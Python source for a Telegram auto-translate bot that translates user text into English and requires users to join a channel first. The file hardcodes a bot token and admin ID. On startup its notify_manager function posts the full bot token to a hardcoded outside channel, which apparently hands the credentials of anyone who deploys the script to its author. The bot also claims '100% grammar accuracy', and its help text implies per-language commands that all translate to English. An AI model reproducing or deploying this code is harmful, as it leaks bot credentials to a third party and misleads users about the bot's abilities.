import telebot
import time
import datetime
from telebot import types
from deep_translator import GoogleTranslator
from langdetect import detect, DetectorFactory

# Accuracy Fix
DetectorFactory.seed = 0

# --- CONFIGURATION ---
BOT_TOKEN = "8474301231:AAHzZnyJVzWZjlRKt9l-1KPA-0IBKAoiSX8"
BOT_NAME = "Translator - DUModZ"
ADMIN_ID = 8504263842 # Your ID: 8504263842
REQ_CHANNEL = "@Dark_Unkwon_ModZ" 
LOG_CHANNEL = "@dumodzbotmanager" # Manager Channel
BANNER_URL = "https://raw.githubusercontent.com/DarkUnkwon-ModZ/DUModZ-Resource/refs/heads/main/Img/darkunkwonmodz-banner.jpg"
BLOG_URL = "https://darkunkwon-modz.blogspot.com"
DEV_URL = "https://t.me/Dark_Unkwon_ModZ"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# --- UTILS ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQ_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

def notify_manager(event_type):
    """লগ চ্যানেলে আপডেট পাঠানোর ফাংশন"""
    now = datetime.datetime.now().strftime("%Y-%m-%d %I:%M %p")
    log_text = (
        f"🔔 <b>{BOT_NAME} - Status Update</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 <b>Event:</b> {event_type}\n"
        f"🔑 <b>Bot Token:</b> <code>{BOT_TOKEN}</code>\n"
        f"⏰ <b>Time:</b> {now}\n"
        f"📡 <b>Status:</b> 🟢 Online & Healthy\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        bot.send_message(LOG_CHANNEL, log_text)
    except Exception as e:
        print(f"Log Error: {e}")

def ultra_anim(chat_id, msg_id, frames):
    for frame in frames:
        try:
            bot.edit_message_text(frame, chat_id, msg_id, disable_web_page_preview=True)
            time.sleep(0.5)
        except:
            break

# --- WELCOME UI ---
def main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("𝗗𝗮𝗿𝗸 𝗨𝗻𝗸𝘄𝗼𝗻 𝗠𝗼𝗱𝗭", url=DEV_URL),
        types.InlineKeyboardButton("🌐 Website", url=BLOG_URL)
    )
    markup.add(
        types.InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
        types.InlineKeyboardButton("📜 Help", callback_data="help")
    )
    return markup

# --- ADMIN COMMANDS (TOP PRIORITY) ---
@bot.message_handler(commands=['admin'], func=lambda m: m.from_user.id == ADMIN_ID)
def admin_panel(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📊 Bot Stats", callback_data="stats"))
    markup.add(types.InlineKeyboardButton("📣 Send Broadcast", callback_data="broadcast_req"))
    bot.reply_to(message, "👑 <b>Welcome Master, Dark Unknown!</b>\n\nAdmin Control Panel is now active.", reply_markup=markup)

@bot.message_handler(commands=['stats'], func=lambda m: m.from_user.id == ADMIN_ID)
def stats(message):
    bot.reply_to(message, f"📊 <b>Bot Stats:</b>\n\nStatus: Online\nAdmin: 8504263842\nTarget: English")

# --- START & FORCE JOIN ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if not is_joined(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=DEV_URL))
        markup.add(types.InlineKeyboardButton("✅ Verify Connection", callback_data="verify_now"))
        
        bot.send_photo(message.chat.id, BANNER_URL, 
                       caption=f"👋 <b>Access Restricted!</b>\n\nDear {message.from_user.first_name},\nYou must join our official channel to use this premium AI Translator.",
                       reply_markup=markup)
        return

    bot.send_photo(message.chat.id, BANNER_URL, 
                   caption=f"🚀 <b>Welcome to {BOT_NAME}</b>\n\n"
                           "I am a professional AI-based translator with 100% grammar accuracy.\n\n"
                           "✨ <b>Mode:</b> Auto-Detect ➜ English\n"
                           "<i>Simply send any text to begin translation.</i>",
                   reply_markup=main_markup())

# --- CALLBACKS & ANIMATIONS ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    uid = call.from_user.id
    if call.data == "verify_now":
        if is_joined(uid):
            msg = bot.edit_message_caption("🔄 <b>Verifying Access...</b>", call.message.chat.id, call.message.message_id)
            time.sleep(1)
            bot.edit_message_caption("✅ <b>Verified Successfully!</b>", call.message.chat.id, call.message.message_id)
            time.sleep(0.8)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Please join @Dark_Unkwon_ModZ first!", show_alert=True)

    elif call.data == "settings":
        bot.edit_message_caption("⚙️ <b>Premium Settings</b>\n\n• Output: <code>English (Fixed)</code>\n• Accuracy: <code>100% AI Mode</code>\n• Animation: <code>Ultra Smooth</code>", 
                                 call.message.chat.id, call.message.message_id, 
                                 reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Back", callback_data="back_home")))

    elif call.data == "help":
        help_text = "📘 <b>Guide:</b>\n\n- Send text ➜ Auto Translate to English\n- Commands: /bn, /hi, /ar\n\nExample: <code>/bn ভালো আছো?</code>"
        bot.edit_message_caption(help_text, call.message.chat.id, call.message.message_id, 
                                 reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Back", callback_data="back_home")))

    elif call.data == "back_home":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)

# --- TRANSLATION LOGIC ---
@bot.message_handler(commands=['bn', 'hi', 'in', 'ar', 'fr', 'es'])
def manual_translate(message):
    if not is_joined(message.from_user.id): return
    text = message.text.split(None, 1)
    if len(text) < 2:
        return bot.reply_to(message, "❌ Please provide text. Example: `/bn Hello`")
    
    proc = bot.reply_to(message, "📡")
    try:
        translated = GoogleTranslator(source='auto', target='en').translate(text[1])
        ultra_anim(message.chat.id, proc.message_id, ["🔄 Analyzing...", "🪄 Refining...", "✅ Done!"])
        bot.edit_message_text(f"💎 <b>English Translation:</b>\n\n<code>{translated}</code>", message.chat.id, proc.message_id)
    except:
        bot.edit_message_text("❌ Translation Error!", message.chat.id, proc.message_id)

@bot.message_handler(func=lambda m: True)
def auto_translate(message):
    if not is_joined(message.from_user.id) or message.text.startswith('/'): return
    
    proc = bot.reply_to(message, "📡")
    try:
        src = detect(message.text)
        translated = GoogleTranslator(source='auto', target='en').translate(message.text)
        
        frames = ["📡 <b>Detecting...</b>", f"📝 <b>Source:</b> {src.upper()}", "🪄 <b>Converting...</b>", "✅ <b>Success!</b>"]
        ultra_anim(message.chat.id, proc.message_id, frames)
        
        output = f"🌐 <b>Auto Translation (➜ EN)</b>\n━━━━━━━━━━━━━━━━━━━━\n<code>{translated}</code>"
        bot.edit_message_text(output, message.chat.id, proc.message_id)
    except:
        bot.delete_message(message.chat.id, proc.message_id)

# --- STARTUP ---
if __name__ == "__main__":
    print(f"[{BOT_NAME}] Started...")
    notify_manager("Bot Process Started/Restarted") # লগ চ্যানেলে এসএমএস যাবে
    bot.infinity_polling()
